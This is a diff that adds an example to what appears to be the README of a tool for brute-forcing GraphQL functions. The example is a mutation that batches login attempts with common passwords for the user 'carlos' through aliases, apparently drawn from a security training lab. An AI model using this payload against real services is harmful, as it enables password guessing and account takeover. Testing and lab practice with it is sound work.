@@ -13,3 +13,17 @@ Allows efficient brute forcing of graphql functions
   // ...repeated hundreds of times
 }
 ```
+# Example
+```
+mutation {
+  bruteforce0:login(input:{password: "123456", username: "carlos"}) {
+          token
+          success
+      }
+  
+  bruteforce1:login(input:{password: "password", username: "carlos"}) {
+          token
+          success
+      }
+}
+```
